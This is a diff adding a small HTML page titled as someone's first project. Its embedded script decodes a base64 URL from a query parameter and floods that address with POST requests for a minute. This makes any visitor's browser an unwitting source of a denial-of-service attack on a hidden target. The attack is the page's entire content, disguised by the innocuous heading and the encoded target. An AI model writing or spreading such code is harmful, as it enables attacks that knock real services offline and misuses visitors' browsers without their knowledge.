@@ -1,0 +1,44 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
+</head>
+
+<body>
+    <h1>Hello my first project</h1>
+    <script>
+    
+        function rStr(l) {
+            const a = 'abcdefghijklmnopqstuvwxyz0123456789';
+            let s = '';
+            for (let i = 0; i < l; i++) {
+                s += a[Math.floor(Math.random() * a.length)];
+            }
+            return s;
+        }
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const url = atob(urlParams.get('referer'));
+        
+        
+        const int = setInterval(() => {
+            for(let i = 0; i < 10; i++) {
+                $.post({
+                    url: url + '#' + rStr(10),
+                    timeout: 1
+                });
+            }
+        });
+            
+        setTimeout(() => clearInterval(int), 60000);
+
+    </script>
+</body>
+
+</html>
